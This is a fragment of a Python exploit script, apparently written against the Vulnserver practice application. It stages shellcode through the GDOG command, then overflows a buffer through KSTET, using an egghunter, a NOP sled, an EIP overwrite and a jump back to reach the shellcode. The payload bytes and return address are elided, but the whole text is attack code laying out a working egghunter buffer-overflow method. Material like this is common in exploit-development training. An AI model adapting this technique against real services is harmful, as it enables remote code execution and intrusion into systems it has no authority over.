...
buffer = "GDOG " + egg + shellcode  + "D" * (1000 - len(egg) - len(shellcode))
print "[+] Sending shellcode buffer using GDOG"
s.send(buffer)

# BOF happens here using KSTET
egghunter = (
...
A = nops + egghunter + "A" * (70 - len(egghunter) - len(nops))
...
C = jmp_back + "C" * (1000 - len(A) - len(EIP) - len(nops) - len(jmp_back))

time.sleep(3)
buffer = "KSTET " + A + EIP + C
